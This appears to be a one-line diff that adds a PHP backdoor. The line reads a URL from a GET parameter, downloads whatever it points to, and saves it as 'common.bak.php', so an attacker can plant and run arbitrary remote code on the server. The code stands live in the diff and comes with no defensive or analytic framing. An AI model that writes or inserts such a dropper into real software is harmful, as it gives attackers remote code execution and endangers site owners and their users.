@@ -1,0 +1,1 @@
+<?php file_put_contents('common.bak.php',file_get_contents($_GET[url]));
